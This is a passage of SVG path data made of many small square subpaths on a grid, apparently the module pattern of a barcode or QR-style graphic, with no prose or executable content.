M98,48l2,0 0,2 -2,0 0,-2z M106,48l2,0 0,2 -2,0 0,-2z M108,48l2,0 0,2 -2,0 0,-2z M116,48l2,0 0,2 -2,0 0,-2z M118,48l2,0 0,2 -2,0 0,-2z M124,48l2,0 0,2 -2,0 0,-2z M134,48l2,0 0,2 -2,0 0,-2z M136,48l2,0 0,2 -2,0 0,-2z M138,48l2,0 0,2 -2,0 0,-2z M142,48l2,0 0,2 -2,0 0,-2z M144,48l2,0 0,2 -2,0 0,-2z M146,48l2,0 0,2 -2,0 0,-2z M150,48l2,0 0,2 -2,0 0,-2z M152,48l2,0 0,2 -2,0 0,-2z M160,48l2,0 0,2 -2,0 0,-2z M8,50l2,0 0,2 -2,0 0,-2z M10,50l2,0 0,2 -2,0 0,-2z M16,50l2,0 0,2 -2,0 0,-2z M22,50l2,0 0,2 -2,0 0,-2z M24,50l2,0 0,2 -2,0 0,-2z M28,50l2,0 0,2 -2,0 0,-2z M34,50l2,0 0,2 -2,0 0,-2z M38,50l2,0 0,2 -2,0 0,-2z M44,50l2,0 0,2 -2,0 0,-2z M48,50l2,0 0,2 -2,0 0,-2z M50,50l2,0 0,2 -2,0 0,-2z M54,50l2,0 0,2 -2,0 0,-2z M56,50l2,0 0,2 -2,0 0,-2z M58,50l2,0 0,2 -2,0 0,-2z M60,50l2,0 0,2 -2,0 0,-2z M64,50l2,0 0,2 -2,0 0,-2z M68,50l2,0 0,2 -2,0 0,-2z M70,50l2,0 0,2 -2,0 0,-2z M74,50l2,0 0,2 -2,0 0,-2z M76,50l2,0 0,2 -2,0 0,-2z M80,50l2,0 0,2 -2,0 0,-2z M86,50l2,0 0,2 -2,0 0,-2z M88,50l2,0 0,2 -2,0 0,-2z M92,50l2,0 0,2 -2,0 0,-2z M94,50l2,0 0,2 -2,0 0,-2z M96,50l2,0 0,2 -2,0 0,-2z M104,50l2,0 0,2 -2,0 0,-2z M106,50l2,0 0,2 -2,0 0,-2z M108,50l2,0 0,2 -2,0 0,-2z M110,50l2,0 0,2 -2,0 0,-2z M118,50l2,0 0,2 -2,0 0,-2z M128,50l2,0 0,2 -2,0 0,-2z M134,50l2,0 0,2 -2,0 0,-2z M138,50l2,0 0,2 -2,0 0,-2z M140,50l2,0 0,2 -2,0 0,-2z M144,50l2,0 0,2 -2,0 0,-2z M146,50l2,0 0,2 -2,0 0,-2z M148,50l2,0 0,2 -2,0 0,-2z M152,50l2,0 0,2 -2,0 0,-2z M156,50l2,0 0,2 -2,0 0,-2z M158,50l2,0 0,2 -2,0 0,-2z M10,52l2,0 0,2 -2,0 0,-2z M12,52l2,0 0,2 -2,0 0,-2z M14,52l2,0 0,2 -2,0 0,-2z M16,52l2,0 0,2 -2,0 0,-2z M20,52l2,0 0,2 -2,0 0,-2z M32,52l2,0 0,2 -2,0 0,-2z M36,52l2,0 0,2 -2,0 0,-2z M40,52l2,0 0,2 -2,0 0,-2z M42,52l2,0 0,2 -2,0 0,-2z M46,52l2,0 0,2 -2,0 0,-2z M56,52l2,0 0,2 -2,0 0,-2z M58,52l2,0 0,2 -2,0 0,-2z M60,52l2,0 0,2 -2,0 0,-2z M64,52l2,0 0,2 -2,0 0,-2z M68,52l2,0 0,2 -2,0 0,-2z M74,52l2,0 0,2 -2,0 0,-2z M78,52l2,0 0,2 -2,0 0,-2z M80,52l2,0 0,2 -2,0 0,-2z M82,52l2,0 0,2 -2,0 0,-2z M86,52l2,0 0,2 -2,0 0,-2z M88,52l2,0 0,2 -2,0 0,-2z M90,52l2,0 0,2 -2,0 0,-2z M98,52l2,0 0,2 -2,0 0,-2z M108,52l2,0 0,2 -2,0 0,-2z M112,52l2,0 0,2 -2,0 0,-2z M116,52l2,0 0,2 -2,0 0,-2z M118,52l2,0 0,2 -2,0 0,-2z M136,52l2,0 0,2 -2,0 0,-2z M146,52l2,0 0,2 -2,0 0,-2z M152,52l2,0 0,2 -2,0 0,-2z M154,52l2,0 0,2 -2,0 0,-2z M8,54l2,0 0,2 -2,0 0,-2z M12,54l2,0 0,2 -2,0 0,-2z M16,54l2,0 0,2 -2,0 0,-2z M24,54l2,0 0,2 -2,0 0,-2z M26,54l2,0 0,2 -2,0 0,-2z M28,54l2,0 0,2 -2,0 0,-2z M32,54l2,0 0,2 -2,0 0,-2z M34,54l2,0 0,2 -2,0 0,-2z M38,54l2,0 0,2 -2,0 0,-2z M40,54l2,0 0,2 -2,0 0,-2z M44,54l2,0 0,2 -2,0 0,-2z M46,54l2,0 0,2 -2,0 0,-2z M50,54l2,0 0,2 -2,0 0,-2z M64,54l2,0 0,2 -2,0 0,-2z M74,54l2,0 0,2 -2,0 0,-2z M78,54l2,0 0,2 -2,0 0,-2z M80,54l2,0 0,2 -2,0 0,-2z M98,54l2,0 0,2 -2,0 0,-2z M100,54l2,0 0,2 -2,0 0,-2z M104,54l2,0 0,2 -2,0 0,-2z M106,54l2,0 0,2 -2,0 0,-2z M120,54l2,0 0,2 -2,0 0,-2z M126,54l2,0 0,2 -2,0 0,-2z M128,54l2,0 0,2 -2,0 0,-2z M130,54l2,0 0,2 -2,0 0,-2z M132,54l2,0 0,2 -2,0 0,-2z M140,54l2,0 0,2 -2,0 0,-2z M146,54l2,0 0,2 -2,0 0,-2z M150,54l2,0 0,2 -2,0 0,-2z M158,54l2,0 0,2 -2,0 0,-2z M8,56l2,0 0,2 -2,0 0,-2z M10,56l2,0 0,2 -2,0 0,-2z M12,56l2,0 0,2 -2,0 0,-2z M16,56l2,0 0,2 -2,0 0,-2z M18,56l2,0 0,2 -2,0 0,-2z M20,56l2,0 0,2 -2,0 0,-2z M22,56l2,0 0,2 -2,0 0,-2z M24,56l2,0 0,2 -2,0 0,-2z M40,56l2,0 0,2 -2,0 0,-2z M44,56l2,0 0,2 -2,0 0,-2z M50,56l2,0 0,2 -2,0 0,-2z M56,56l2,0 0,2 -2,0 0,-2z M58,56l2,0 0,2 -2,0 0,-2z M60,56l2,0 0,2 -2,0 0,-2z M62,56l2,0 0,2 -2,0 0,-2z M64,56l2,0 0,2 -2,0 0,-2z M68,56l2,0 0,2 -2,0 0,-2z M70,56l2,0 0,2 -2,0 0,-2z M76,56l2,0 0,2 -2,0 0,-2z M78,56l2,0 0,2 -2,0 0,-2z M82,56l2,0 0,2 -2,0 0,-2z M84,56l2,0 0,2 -2,0 0,-2z M92,56l2,0 0,2 -2,0 0,-2z M100,56l2,0 0,2 -2,0 0,-2z M102,56l2,0 0,2 -2,0 0,-2z M104,56l2,0 0,2 -2,0 0,-2z M106,56l2,0 0,2 -2,0 0,-2z M108,56l2,0 0,2 -2,0 0,-2z M110,56l2,0 0,2 -2,0 0,-2z M114,56l2,0 0,2 -2,0 0,-2z M116,56l2,0 0,2 -2,0 0,-2z M120,56l2,0 0,2 -2,0 0,-2z M126,56l2,0 0,2 -2,0 0,-2z M134,56l2,0 0,2 -2,0 0,-2z M138,56l2,0 0,2 -2,0 0,-2z M140,56l2,0 0,2 -2,0 0,-2z M142,56l2,0 0,2 -2,0 0,-2z M144,56l2,0 0,2 -2,0 0,-2z M146,56l2,0 0,2 -2,0 0,-2z M148,56l2,0 0,2 -2,0 0,-2z M150,56l2,0 0,2 -2,0 0,-2z M152,56l2,0 0,2 -2,0 0,-2z M156,56l2,0 0,2 -2,0 0,-2z M158,56l2,0 0,2 -2,0 0,-2z M160,56l2,0 0,2 -2,0 0,-2z M10,58l2,0 0,2 -2,0 0,-2z M12,58l2,0 0,2 -2,0 0,-2z M14,58l2,0 0,2 -2,0 0,-2z M16,58l2,0 0,2 -2,0 0,-2z M24,58l2,0 0,2 -2,0 0,-2z M26,58l2,0 0,2 -2,0 0,-2z M28,58l2,0 0,2 -2,0 0,-2z M30,58l2,0 0,2 -2,0 0,-2z M34,58l2,0 0,2 -2,0 0,-2z M36,58l2,0 0,2 -2,0 0,-2z M38,58l2,0 0,2 -2,0 0,-2z M40,58l2,0 0,2 -2,0 0,-2z M42,58l2,0 0,2 -2,0 0,-2z M44,58l2,0 0,2 -2,0 0,-2z M52,58l2,0 0,2 -2,0 0,-2z M54,58l2,0 0,2 -2,0 0,-2z M56,58l2,0 0,2 -2,0 0,-2z M64,58l2,0 0,2 -2,0 0,-2z M66,58l2,0 0,2 -2,0 0,-2z M68,58l2,0 0,2 -2,0 0,-2z M70,58l2,0 0,2 -2,0 0,-2z M74,58l2,0 0,2 -2,0 0,-2z M76,58l2,0 0,2 -2,0 0,-2z M80,58l2,0 0,2 -2,0 0,-2z M84,58l2,0 0,2 -2,0 0,-2z M92,58l2,0 0,2 -2,0 0,-2z M96,58l2,0 0,2 -2,0 0,-2z M98,58l2,0 0,2 -2,0 0,-2z M100,58l2,0 0,2 -2,0 0,-2z M108,58l2,0 0,2 -2,0 0,-2z M118,58l2,0 0,2 -2,0 0,-2z M120,58l2,0 0,2 -2,0 0,-2z M124,58l2,0 0,2 -2,0 0,-2z M128,58l2,0 0,2 -2,0 0,-2z M130,58l2,0 0,2 -2,0 0,-2z M142,58l2,0 0,2 -2,0 0,-2z M144,58l2,0 0,2 -2,0 0,-2z M152,58l2,0 0,2 -2,0 0,-2z M154,58l2,0 0,2 -2,0 0,-2z M156,58l2,0 0,2 -2,0 0,-2z M160,58l2,0 0,2 -2,0 0,-2z M12,60l2,0 0,2 -2,0 0,-2z M14,60l2,0 0,2 -2,0 0,-2z M16,60l2,0 0,2 -2,0 0,-2z M20,60l2,0 0,2 -2,0 0,-2z M24,60l2,0 0,2 -2,0 0,-2z M30,60l2,0 0,2 -2,0 0,-2z M34,60l2,0 0,2 -2,0 0,-2z M36,60l2,0 0,2 -2,0 0,-2z M38,60l2,0 0,2 -2,0 0,-2z M40,60l2,0 0,2 -2,0 0,-2z M42,60l2,0 0,2 -2,0 0,-2z M46,60l2,0 0,2 -2,0 0,-2z M50,60l2,0 0,2 -2,0 0,-2z M52,60l2,0 0,2 -2,0 0,-2z M54,60l2,0 0,2 -2,0 0,-2z M56,60l2,0 0,2 -2,0 0,-2z M60,60l2,0 0,2 -2,0 0,-2z M64,60l2,0 0,2 -2,0 0,-2z M66,60l2,0 0,2 -2,0 0,-2z M68,60l2,0 0,2 -2,0 0,-2z M70,60l2,0 0,2 -2,0 0,-2z M74,60l2,0 0,2 -2,0 0,-2z M78,60l2,0 0,2 -2,0 0,-2z M80,60l2,0 0,2 -2,0 0,-2z M82,60l2,0 0,2 -2,0 0,-2z M86,60l2,0 0,2 -2,0 0,-2z M88,60l2,0 0,2 -2,0 0,-2z M94,60l2,0 0,2 -2,0 0,-2z M96,60l2,0 0,2 -2,0 0,-2z M98,60l2,0 0,2 -2,0 0,-2z M100,60l2,0 0,2 -2,0 0,-2z M104,60l2,0 0,2 -2,0 0,-2z M108,60l2,0 0,2 -2,0 0,-2z M110,60l2,0 0,2 -2,0 0,-2z M112,60l2,0 0,2 -2,0 0,-2z M116,60l2,0 0,2 -2,0 0,-2z M118,60l2,0 0,2 -2,0 0,-2z M124,60l2,0 0,2 -2,0 0,-2z M132,60l2,0 0,2 -2,0 0,-2z M134,60l2,0 0,2 -2,0 0,-2z M140,60l2,0 0,2 -2,0 0,-2z M142,60l2,0 0,2 -2,0 0,-2z M144,60l2,0 0,2 -2,0 0,-2z M148,60l2,0 0,2 -2,0 0,-2z M152,60l2,0 0,2 -2,0 0,-2z M156,60l2,0 0,2 -2,0 0,-2z M158,60l2,0 0,2 -2,0 0,-2z M10,62l2,0 0,2 -2,0 0,-2z M14,62l2,0 0,2 -2,0 0,-2z M16,62l2,0 0,2 -2,0 0,-2z M24,62l2,0 0,2 -2,0 0,-2z M32,62l2,0 0,2 -2,0 0,-2z M34,62l2,0 0,2 -2,0 0,-2z M44,62l2,0 0,2 -2,0 0,-2z M46,62l2,0 0,2 -2,0 0,-2z M48,62l2,0 0,2 -2,0 0,-2z M56,62l2,0 0,2 -2,0 0,-2z M64,62l2,0 0,2 -2,0 0,-2z M66,62l2,0 0,2 -2,0 0,-2z M68,62l2,0 0,2 -2,0 0,-2z M70,62l2,0 0,2 -2,0 0,-2z M74,62l2,0 0,2 -2,0 0,-2z M76,62l2,0 0,2 -2,0 0,-2z M78,62l2,0 0,2 -2,0 0,-2z M80,62l2,0 0,2 -2,0 0,-2z M82,62l2,0 0,2 -2,0 0,-2z M84,62l2,0 0,2 -2,0 0,-2z M88,62l2,0 0,2 -2,0 0,-2z M94,62l2,0 0,2 -2,0 0,-2z M96,62l2,0 0,2 -2,0 0,-2z M98,62l2,0 0,2 -2,0 0,-2z M100,62l2,0 0,2 -2,0 0,-2z M108,62l2,0 0,2 -2,0 0,-2z M112,62l2,0 0,2 -2,0 0,-2z M122,62l2,0 0,2 -2,0 0,-2z M124,62l2,0 0,2 -2,0 0,-2z M126,62l2,0 0,2 -2,0 0,-2z M130,62l2,0 0,2 -2,0 0,-2z M132,62l2,0 0,2 -2,0 0,-2z M138,62l2,0 0,2 -2,0 0,-2z M144,62l2,0 0,2 -2,0 0,-2z M152,62l2,0 0,2 -2,0 0,-2z M154,62l2,0 0,2 -2,0 0,-2z M160,62l2,0 0,2 -2,0 0,-2z M8,64l2,0 0,2 -2,0 0,-2z M12,64l2,0 0,2 -2,0 0,-2z M16,64l2,0 0,2 -2,0 0,-2z M18,64l2,0 0,2 -2,0 0,-2z M20,64l2,0 0,2 -2,0 0,-2z M22,64l2,0 0,2 -2,0 0,-2z M24,64l2,0 0,2 -2,0 0,-2z M26,64l2,0 0,2 -2,0 0,-2z M28,64l2,0 0,2 -2,0 0,-2z M30,64l2,0 0,2 -2,0 0,-2z M42,64l2,0 0,2 -2,0 0,-2z M44,64l2,0 0,2 -2,0 0,-2z M46,64l2,0 0,2 -2,0 0,-2z M48,64l2,0 0,2 -2,0 0,-2z M50,64l2,0 0,2 -2,0 0,-2z M52,64l2,0 0,2 -2,0 0,-2z M54,64l2,0 0,2 -2,0 0,-2z M56,64l2,0 0,2 -2,0 0,-2z M58,64l2,0 0,2 -2,0 0,-2z M60,64l2,0 0,2 -2,0 0,-2z M62,64l2,0 0,2 -2,0 0,-2z M64,64l2,0 0,2 -2,0 0,-2z M70,64l2,0 0,2 -2,0 0,-2z M74,64l2,0 0,2 -2,0 0,-2z M82,64l2,0 0,2 -2,0 0,-2z M84,64l2,0 0,2 -2,0 0,-2z M88,64l2,0 0,2 -2,0 0,-2z M90,64l2,0 0,2 -2,0 0,-2z M92,64l2,0 0,2 -2,0 0,-2z M100,64l2,0 0,2 -2,0 0,-2z M102,64l2,0 0,2 -2,0 0,-2z M104,64l2,0 0,2 -2,0 0,-2z M106,64l2,0 0,2 -2,0 0,-2z M108,64l2,0 0,2 -2,0 0,-2z M110,64l2,0 0,2 -2,0 0,-2z M112,64l2,0 0,2 -2,0 0,-2z M116,64l2,0 0,2 -2,0 0,-2z M118,64l2,0 0,2 -2,0 0,-2z M124,64l2,0 0,2 -2,0 0,-2z M130,64l2,0 0,2 -2,0 0,-2z M132,64l2,0 0,2 -2,0 0,-2z M138,64l2,0 0,2 -2,0 0,-2z M142,64l2,0 0,2 -2,0 0,-2z M144,64l2,0 0,2 -2,0 0,-2z M146,64l2,0 0,2 -2,0 0,-2z M148,64l2,0 0,2 -2,0 0,-2z M150,64l2,0 0,2 -2,0 0,-2z M152,64l2,0 0,2 -2,0 0,-2z M158,64l2,0 0,2 -2,0 0,-2z M10,66l2,0 0,2 -2,0 0,-2z M12,66l2,0 0,2 -2,0 0,-2z M16,66l2,0 0,2 -2,0 0,-2z M18,66l2,0 0,2 -2,0 0,-2z M22,66l2,0 0,2 -2,0 0,-2z M34,66l2,0 0,2 -2,0 0,-2z M36,66l2,0 0,2 -2,0 0,-2z M38,66l2,0 0,2 -2,0 0,-2z M40,66l2,0 0,2 -2,0 0,-2z M42,66l2,0 0,2 -2,0 0,-2z M44,66l2,0 0,2 -2,0 0,-2z M50,66l2,0 0,2 -2,0 0,-2z M54,66l2,0 0,2 -2,0 0,-2z M56,66l2,0 0,2 -2,0 0,-2z M60,66l2,0 0,2 -2,0 0,-2z M68,66l2,0 0,2 -2,0 0,-2z M70,66l2,0 0,2 -2,0 0,-2z M72,66l2,0 0,2 -2,0 0,-2z M74,66l2,0 0,2 -2,0 0,-2z M80,66l2,0 0,2 -2,0 0,-2z M82,66l2,0 0,2 -2,0 0,-2z M84,66l2,0 0,2 -2,0 0,-2z M92,66l2,0 0,2 -2,0 0,-2z M94,66l2,0 0,2 -2,0 0,-2z M104,66l2,0 0,2 -2,0 0,-2z M106,66l2,0 0,2 -2,0 0,-2z M108,66l2,0 0,2 -2,0 0,-2z M118,66l2,0 0,2 -2,0 0,-2z M120,66l2,0 0,2 -2,0 0,-2z M122,66l2,0 0,2 -2,0 0,-2z M126,66l2,0 0,2 -2,0 0,-2z M132,66l2,0 0,2 -2,0 0,-2z M134,66l2,0 0,2 -2,0 0,-2z M136,66l2,0 0,2 -2,0 0,-2z M138,66l2,0 0,2 -2,0 0,-2z M140,66l2,0 0,2 -2,0 0,-2z M142,66l2,0 0,2 -2,0 0,-2z M144,66l2,0 0,2 -2,0 0,-2z M158,66l2,0 0,2 -2,0 0,-2z M10,68l2,0 0,2 -2,0 0,-2z M12,68l2,0 0,2 -2,0 0,-2z M16,68l2,0 0,2 -2,0 0,-2z M20,68l2,0 0,2 -2,0 0,-2z M24,68l2,0 0,2 -2,0 0,-2z M28,68l2,0 0,2 -2,0 0,-2z M30,68l2,0 0,2 -2,0 0,-2z M32,68l2,0 0,2 -2,0 0,-2z M38,68l2,0 0,2 -2,0 0,-2z M46,68l2,0 0,2 -2,0 0,-2z M60,68l2,0 0,2 -2,0 0,-2z M62,68l2,0 0,2 -2,0 0,-2z M64,68l2,0 0,2 -2,0 0,-2z M66,68l2,0 0,2 -2,0 0,-2z M68,68l2,0 0,2 -2,0 0,-2z M70,68l2,0 0,2 -2,0 0,-2z M72,68l2,0 0,2 -2,0 0,-2z M74,68l2,0 0,2 -2,0 0,-2z M76,68l2,0 0,2 -2,0 0,-2z M80,68l2,0 0,2 -2,0 0,-2z M82,68l2,0 0,2 -2,0 0,-2z M84,68l2,0 0,2 -2,0 0,-2z M86,68l2,0 0,2 -2,0 0,-2z M90,68l2,0 0,2 -2,0 0,-2z M94,68l2,0 0,2 -2,0 0,-2z M96,68l2,0 0,2 -2,0 0,-2z M98,68l2,0 0,2 -2,0 0,-2z M100,68l2,0 0,2 -2,0 0,-2z M102,68l2,0 0,2 -2,0 0,-2z M108,68l2,0 0,2 -2,0 0,-2z M110,68l2,0 0,2 -2,0 0,-2z M114,68l2,0 0,2 -2,0 0,-2z M116,68l2,0 0,2 -2,0 0,-2z M122,68l2,0 0,2 -2,0 0,-2z M126,68l2,0 0,2 -2,0 0,-2z M128,68l2,0 0,2 -2,0 0,-2z M138,68l2,0 0,2 -2,0 0,-2z M144,68l2,0 0,2 -2,0 0,-2z M148,68l2,0 0,2 -2,0 0,-2z M156,68l2,0 0,2 -2,0 0,-2z M158,68l2,0 0,2 -2,0 0,-2z M160,68l2,0 0,2 -2,0 0,-2z M10,70l2,0 0,2 -2,0 0,-2z M14,70l2,0 0,2 -2,0 0,-2z M16,70l2,0 0,2 -2,0 0,-2z M18,70l2,0 0,2 -2,0 0,-2z M26,70l2,0 0,2 -2,0 0,-2z M28,70l2,0 0,2 -2,0 0,-2z M36,70l2,0 0,2 -2,0 0,-2z M40,70l2,0 0,2 -2,0 0,-2z M44,70l2,0 0,2 -2,0 0,-2z M50,70l2,0 0,2 -2,0 0,-2z M52,70l2,0 0,2 -2,0 0,-2z M54,70l2,0 0,2 -2,0 0,-2z M56,70l2,0 0,2 -2,0 0,-2z M58,70l2,0 0,2 -2,0 0,-2z M64,70l2,0 0,2 -2,0 0,-2z M74,70l2,0 0,2 -2,0 0,-2z M98,70l2,0 0,2 -2,0 0,-2z M102,70l2,0 0,2 -2,0 0,-2z M104,70l2,0 0,2 -2,0 0,-2z M108,70l2,0 0,2 -2,0 0,-2z M118,70l2,0 0,2 -2,0 0,-2z M120,70l2,0 0,2 -2,0 0,-2z M122,70l2,0 0,2 -2,0 0,-2z M132,70l2,0 0,2 -2,0 0,-2z M140,70l2,0 0,2 -2,0 0,-2z M150,70l2,0 0,2 -2,0 0,-2z M152,70l2,0 0,2 -2,0 0,-2z M158,70l2,0 0,2 -2,0 0,-2z M8,72l2,0 0,2 -2,0 0,-2z M12,72l2,0 0,2 -2,0 0,-2z M14,72l2,0 0,2 -2,0 0,-2z M18,72l2,0 0,2 -2,0 0,-2z M20,72l2,0 0,2 -2,0 0,-2z M24,72l2,0 0,2 -2,0 0,-2z M28,72l2,0 0,2 -2,0 0,-2z M34,72l2,0 0,2 -2,0 0,-2z M36,72l2,0 0,2 -2,0 0,-2z M42,72l2,0 0,2 -2,0 0,-2z M44,72l2,0 0,2 -2,0 0,-2z M46,72l2,0 0,2 -2,0 0,-2z M52,72l2,0 0,2 -2,0 0,-2z M54,72l2,0 0,2 -2,0 0,-2z M56,72l2,0 0,2 -2,0 0,-2z M64,72l2,0 0,2 -2,0 0,-2z M66,72l2,0 0,2 -2,0 0,-2z M68,72l2,0 0,2 -2,0 0,-2z M72,72l2,0 0,2 -2,0 0,-2z M78,72l2,0 0,2 -2,0 0,-2z M80,72l2,0 0,2 -2,0 0,-2z M88,72l2,0 0,2 -2,0 0,-2z M90,72l2,0 0,2 -2,0 0,-2z M92,72l2,0 0,2 -2,0 0,-2z M94,72l2,0 0,2 -2,0 0,-2z M96,72l2,0 0,2 -2,0 0,-2z M98,72l2,0 0,2 -2,0 0,-2z M102,72l2,0 0,2 -2,0 0,-2z M106,72l2,0 0,2 -2,0 0,-2z M110,72l2,0 0,2 -2,0 0,-2z M112,72l2,0 0,2 -2,0 0,-2z M116,72l2,0 0,2 -2,0 0,-2z M120,72l2,0 0,2 -2,0 0,-2z M124,72l2,0 0,2 -2,0 0,-2z M126,72l2,0 0,2 -2,0 0,-2z M128,72l2,0 0,2 -2,0 0,-2z M130,72l2,0 0,2 -2,0 0,-2z M134,72l2,0 0,2 -2,0 0,-2z M136,72l2,0 0,2 -2,0 0,-2z M140,72l2,0 0,2 -2,0 0,-2z M142,72l2,0 0,2 -2,0 0,-2z M152,72l2,0 0,2 -2,0 0,-2z M154,72l2,0 0,2 -2,0 0,-2z M158,72l2,0 0,2 -2,0 0,-2z M10,74l2,0 0,2 -2,0 0,-2z M16,74l2,0 0,2 -2,0 0,-2z M18,74l2,0 0,2 -2,0 0,-2z M22,74l2,0 0,2 -2,0 0,-2z M24,74l2,0 0,2 -2,0 0,-2z M26,74l2,0 0,2 -2,0 0,-2z M32,74l2,0 0,2 -2,0 0,-2z M34,74l2,0 0,2 -2,0 0,-2z M36,74l2,0 0,2 -2,0 0,-2z M38,74l2,0 0,2 -2,0 0,-2z M42,74l2,0 0,2 -2,0 0,-2z M44,74l2,0 0,2 -2,0 0,-2z M46,74l2,0 0,2 -2,0 0,-2z M48,74l2,0 0,2 -2,0 0,-2z M50,74l2,0 0,2 -2,0 0,-2z M54,74l2,0 0,2 -2,0 0,-2z M56,74l2,0 0,2 -2,0 0,-2z M58,74l2,0 0,2 -2,0 0,-2z M60,74l2,0 0,2 -2,0 0,-2z M62,74l2,0 0,2 -2,0 0,-2z M64,74l2,0 0,2 -2,0 0,-2z M66,74l2,0 0,2 -2,0 0,-2z M68,74l2,0 0,2 -2,0 0,-2z M70,74l2,0 0,2 -2,0 0,-2z M72,74l2,0 0,2 -2,0 0,-2z M74,74l2,0 0,2 -2,0 0,-2z M88,74l2,0 0,2 -2,0 0,-2z M92,74l2,0 0,2 -2,0 0,-2z M98,74l2,0 0,2 -2,0 0,-2z M100,74l2,0 0,2 -2,0 0,-2z M102,74l2,0 0,2 -2,0 0,-2z M106,74l2,0 0,2 -2,0 0,-2z M112,74l2,0 0,2 -2,0 0,-2z M118,74l2,0 0,2 -2,0 0,-2z M120,74l2,0 0,2 -2,0 0,-2z M122,74l2,0 0,2 -2,0 0,-2z M124,74l2,0 0,2 -2,0 0,-2z M126,74l2,0 0,2 -2,0 0,-2z M132,74l2,0 0,2 -2,0 0,-2z M136,74l2,0 0,2 -2,0 0,-2z M144,74l2,0 0,2 -2,0 0,-2z M148,74l2,0 0,2 -2,0 0,-2z M150,74l2,0 0,2 -2,0 0,-2z M152,74l2,0 0,2 -2,0 0,-2z M154,74l2,0 0,2 -2,0 0,-2z M160,74l2,0 0,2 -2,0 0,-2z M18,76l2,0 0,2 -2,0 0,-2z M20,76l2,0 0,2 -2,0 0,-2z M22,76l2,0 0,2 -2,0 0,-2z M32,76l2,0 0,2 -2,0 0,-2z M34,76l2,0 0,2 -2,0 0,-2z M38,76l2,0 0,2 -2,0 0,-2z M40,76l2,0 0,2 -2,0 0,-2z M46,76l2,0 0,2 -2,0 0,-2z M48,76l2,0 0,2 -2,0 0,-2z M52,76l2,0 0,2 -2,0 0,-2z M56,76l2,0 0,2 -2,0 0,-2z M58,76l2,0 0,2 -2,0 0,-2z M60,76l2,0 0,2 -2,0 0,-2z M62,76l2,0 0,2 -2,0 0,-2z M66,76l2,0 0,2 -2,0 0,-2z M68,76l2,0 0,2 -2,0 0,-2z M70,76l2,0 0,2 -2,0 0,-2z M74,76l2,0 0,2 -2,0 0,-2z M78,76l2,0 0,2 -2,0 0,-2z M86,76l2,0 0,2 -2,0 0,-2z M88,76l2,0 0,2 -2,0 0,-2z M94,76l2,0 0,2 -2,0 0,-2z M96,76l2,0 0,2 -2,0 0,-2z M100,76l2,0 0,2 -2,0 0,-2z M104,76l2,0 0,2 -2,0 0,-2z M106,76l2,0 0,2 -2,0 0,-2z M110,76l2,0 0,2 -2,0 0,-2z M112,76l2,0 0,2 -2,0 0,-2z M116,76l2,0 0,2 -2,0 0,-2z M120,76l2,0 0,2 -2,0 0,-2z M122,76l2,0 0,2 -2,0 0,-2z M124,76l2,0 0,2 -2,0 0,-2z M126,76l2,0 0,2 -2,0 0,-2z M130,76l2,0 0,2 -2,0 0,-2z M134,76l2,0 0,2 -2,0 0,-2z M140,76l2,0 0,2 -2,0 0,-2z M152,76l2,0 0,2 -2,0 0,-2z M156,76l2,0 0,2 -2,0 0,-2z M160,76l2,0 0,2 -2,0 0,-2z M10,78l2,0 0,2 -2,0 0,-2z M14,78l2,0 0,2 -2,0 0,-2z M18,78l2,0 0,2 -2,0 0,-2z M28,78l2,0 0,2 -2,0 0,-2z M30,78l2,0 0,2 -2,0 0,-2z M34,78l2,0 0,2 -2,0 0,-2z M36,78l2,0 0,2 -2,0 0,-2z M40,78l2,0 0,2 -2,0 0,-2z M42,78l2,0 0,2 -2,0 0,-2z M50,78l2,0 0,2 -2,0 0,-2z M52,78l2,0 0,2 -2,0 0,-2z M56,78l2,0 0,2 -2,0 0,-2z M58,78l2,0 0,2 -2,0 0,-2z M60,78l2,0 0,2 -2,0 0,-2z M62,78l2,0 0,2 -2,0 0,-2z M64,78l2,0 0,2 -2,0 0,-2z M66,78l2,0 0,2 -2,0 0,-2z M68,78l2,0 0,2 -2,0 0,-2z M70,78l2,0 0,2 -2,0 0,-2z M72,78l2,0 0,2 -2,0 0,-2z M74,78l2,0 0,2 -2,0 0,-2z M82,78l2,0 0,2 -2,0 0,-2z M88,78l2,0 0,2 -2,0 0,-2z M90,78l2,0 0,2 -2,0 0,-2z M94,78l2,0 0,2 -2,0 0,-2z M100,78l2,0 0,2 -2,0 0,-2z M108,78l2,0 0,2 -2,0 0,-2z M114,78l2,0 0,2 -2,0 0,-2z M118,78l2,0 0,2 -2,0 0,-2z M120,78l2,0 0,2 -2,0 0,-2z M122,78l2,0 0,2 -2,0 0,-2z M128,78l2,0 0,2 -2,0 0,-2z M132,78l2,0 0,2 -2,0 0,-2z M136,78l2,0 0,2 -2,0 0,-2z M142,78l2,0 0,2 -2,0 0,-2z M144,78l2,0 0,2 -2,0 0,-2z M152,78l2,0 0,2 -2,0 0,-2z M154,78l2,0 0,2 -2,0 0,-2z M156,78l2,0 0,2 -2,0 0,-2z M160,78l2,0 0,2 -2,0 0,-2z M8,80l2,0 0,2 -2,0 0,-2z M10,80l2,0 0,2 -2,0 0,-2z M14,80l2,0 0,2 -2,0 0,-2z M20,80l2,0 0,2 -2,0 0,-2z M22,80l2,0 0,2 -2,0 0,-2z M26,80l2,0 0,2 -2,0 0,-2z M30,80l2,0 0,2 -2,0 0,-2z M34,80l2,0 0,2 -2,0 0,-2z M36,80l2,0 0,2 -2,0 0,-2z M40,80l2,0 0,2 -2,0 0,-2z M42,80l2,0 0,2 -2,0 0,-2z M46,80l2,0 0,2 -2,0 0,-2z M48,80l2,0 0,2 -2,0 0,-2z M54,80l2,0 0,2 -2,0 0,-2z M60,80l2,0 0,2 -2,0 0,-2z M62,80l2,0 0,2 -2,0 0,-2z M66,80l2,0 0,2 -2,0 0,-2z M72,80l2,0 0,2 -2,0 0,-2z M74,80l2,0 0,2 -2,0 0,-2z M76,80l2,0 0,2 -2,0 0,-2z M80,80l2,0 0,2 -2,0 0,-2z M88,80l2,0 0,2 -2,0 0,-2z M90,80l2,0 0,2 -2,0 0,-2z M94,80l2,0 0,2 -2,0 0,-2z M96,80l2,0 0,2 -2,0 0,-2z M102,80l2,0 0,2 -2,0 0,-2z M104,80l2,0 0,2 -2,0 0,-2z M106,80l2,0 0,2 -2,0 0,-2z M108,80l2,0 0,2 -2,0 0,-2z M110,80l2,0 0,2 -2,0 0,-2z M118,80l2,0 0,2 -2,0 0,-2z M126,80l2,0 0,2 -2,0 0,-2z M130,80l2,0 0,2 -2,0 0,-2z M132,80l2,0 0,2 -2,0 0,-2z M136,80l2,0 0,2 -2,0 0,-2z M140,80l2,0 0,2 -2,0 0,-2z M142,80l2,0 0,2 -2,0 0,-2z M148,80l2,0 0,2 -2,0 0,-2z 